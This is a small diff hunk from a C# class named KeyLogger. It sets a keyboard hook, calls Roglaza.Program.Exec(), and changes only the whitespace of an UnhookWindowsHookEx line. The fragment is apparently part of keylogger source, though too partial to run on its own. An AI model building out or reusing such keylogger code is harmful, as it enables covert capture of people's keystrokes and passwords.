@@ -64,7 +64,7 @@ class KeyLogger
             _hookID = SetHook(_proc);
             //Application.Run();
             Roglaza.Program.Exec();
-            UnhookWindowsHookEx(_hookID);
+                UnhookWindowsHookEx(_hookID); 
         }
         else
         {
